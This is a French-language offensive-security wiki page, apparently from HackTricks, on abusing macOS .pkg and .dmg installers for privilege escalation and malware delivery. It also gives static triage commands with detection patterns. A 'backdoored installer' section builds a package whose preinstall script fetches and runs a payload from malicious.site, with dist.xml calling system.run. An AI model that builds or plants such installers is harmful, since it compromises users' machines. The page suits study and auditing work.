# Abus des installateurs macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base sur Pkg

Un **paquet d’installation** macOS (également connu sous le nom de fichier `.pkg`) est un format de fichier utilisé par macOS pour **distribuer des logiciels**. Ces fichiers sont comme une **boîte qui contient tout ce dont un logiciel a besoin** pour s’installer et fonctionner correctement.

Le fichier du paquet lui-même est une archive qui contient une **hiérarchie de fichiers et de répertoires qui seront installés sur l’ordinateur cible**. Il peut aussi inclure des **scripts** pour effectuer des tâches avant et après l’installation, comme la configuration de fichiers de configuration ou le nettoyage d’anciennes versions du logiciel.

### Hiérarchie

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)** : Personnalisations (titre, texte de bienvenue…) et vérifications de script/d’installation
- **PackageInfo (xml)** : Infos, exigences d’installation, emplacement d’installation, chemins vers les scripts à exécuter
- **Bill of materials (bom)** : Liste des fichiers à installer, mettre à jour ou supprimer avec les permissions des fichiers
- **Payload (CPIO archive gzip compressed)** : Fichiers à installer dans le `install-location` depuis PackageInfo
- **Scripts (CPIO archive gzip compressed)** : Scripts de pré- et post-installation et autres ressources extraites dans un répertoire temporaire pour exécution.

### Décompresser
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Afin de visualiser le contenu de l’installateur sans le décompresser manuellement, vous pouvez aussi utiliser l’outil gratuit [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Raccourcis de triage statique

Si l’objectif est l’analyse, essayez d’**éviter d’ouvrir d’abord le package avec `Installer.app`**. Certains packages peuvent exécuter du code dès que Installer les ouvre (par exemple via `system.run()` ou des plug-ins d’installation), donc l’extraction hors ligne est généralement le point de départ le plus sûr.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Informations de base sur DMG

Les fichiers DMG, ou Apple Disk Images, sont un format de fichier utilisé par macOS d'Apple pour les images disque. Un fichier DMG est essentiellement une **image disque montable** (il contient son propre système de fichiers) qui contient des données brutes de blocs, généralement compressées et parfois chiffrées. Lorsque vous ouvrez un fichier DMG, macOS **le monte comme s'il s'agissait d'un disque physique**, ce qui vous permet d'accéder à son contenu.

> [!CAUTION]
> Notez que les installateurs **`.dmg`** prennent en charge **tellement de formats** que, par le passé, certains d'entre eux contenant des vulnérabilités ont été abusés pour obtenir une **exécution de code dans le kernel**.

### Hiérarchie

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La hiérarchie d'un fichier DMG peut varier selon le contenu. Cependant, pour les DMG d'applications, elle suit généralement cette structure :

- Niveau supérieur : C'est la racine de l'image disque. Elle contient souvent l'application et éventuellement un lien vers le dossier Applications.
- Application (.app) : C'est l'application réelle. Sous macOS, une application est généralement un package qui contient de nombreux fichiers et dossiers individuels qui composent l'application.
- Lien Applications : C'est un raccourci vers le dossier Applications dans macOS. Son but est de faciliter l'installation de l'application. Vous pouvez faire glisser le fichier .app vers ce raccourci pour installer l'application.

## Privesc via pkg abuse

### Execution from public directories

Si un script de préinstallation ou de postinstallation s'exécute par exemple depuis **`/var/tmp/Installerutil`**, et qu'un attaquant peut contrôler ce script, il peut élever ses privilèges à chaque fois qu'il est exécuté. Ou un autre exemple similaire :

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Il s'agit d'une [fonction publique](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que plusieurs installateurs et programmeurs de mise à jour appelleront pour **exécuter quelque chose en tant que root**. Cette fonction accepte le **chemin** du **fichier** à **exécuter** en paramètre ; cependant, si un attaquant pouvait **modifier** ce fichier, il serait en mesure d'**abuser** de son exécution avec les privilèges root pour **élever ses privilèges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Pour plus d'informations, consultez cette discussion : [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Abus de l'environnement et du shebang

Les bugs modernes de PackageKit ont montré que les scripts d'installation sont souvent exécutés comme du **code root de confiance** tout en conservant à proximité un contexte contrôlé par l'attaquant. Lors de l'audit des packages des éditeurs, portez une attention particulière à :

- Des interpréteurs shell tels que `#!/bin/zsh` / `#!/bin/bash`
- Des appels comme `sudo -u $USER`, `launchctl asuser`, ou toute logique qui fait confiance à `$USER`, `$HOME`, `PATH`, `TMPDIR`, ou à des chemins relatifs
- Des interpréteurs non-shell qui peuvent charger des fichiers init ou des bibliothèques contrôlés par l'utilisateur
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Pour le bug de l’environnement root de PackageKit de 2024 (`~/.zshenv` / `~/.bash*` hérité pendant les installs lancées par l’utilisateur), consultez [the generic macOS privesc page](../macos-privilege-escalation.md). Si le package est **Apple-signed**, le même bug de script peut devenir **SIP/TCC-relevant** car `system_installd` peut porter `com.apple.rootless.install.heritable` ; voir [the SIP page](../macos-security-protections/macos-sip.md).

### Exécution par montage

Si un installer écrit dans `/tmp/fixedname/bla/bla`, il est possible de **créer un montage** au-dessus de `/tmp/fixedname` avec noowners afin de pouvoir **modifier n’importe quel fichier pendant l’installation** et abuser du processus d’installation.

Un exemple de cela est **CVE-2021-26089** qui a réussi à **écraser un script périodique** pour obtenir l’exécution en tant que root. Pour plus d’informations, regardez la conférence : [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg comme malware

### Empty Payload

Il est possible de simplement générer un fichier **`.pkg`** avec des scripts **pre et post-install** sans aucun payload réel en dehors du malware contenu dans les scripts.

### JS dans le Distribution xml

Il est possible d’ajouter des balises **`<script>`** dans le fichier **distribution xml** du package, et ce code sera exécuté et pourra **exécuter des commandes** en utilisant **`system.run`** :

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Dans les packages de distribution, cela dépend généralement du fichier `Distribution` de niveau supérieur qui सक्रिय les scripts externes, par exemple avec `allow-external-scripts="true"`. Donc, ne vérifier que `preinstall` / `postinstall` ne suffit pas : le **Distribution XML** lui-même peut contenir des hooks `installation-check` / `volume-check` et des chemins d’exécution directs `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installateur backdooré

Installateur malveillant utilisant un script et du code JS à l’intérieur de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Références

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
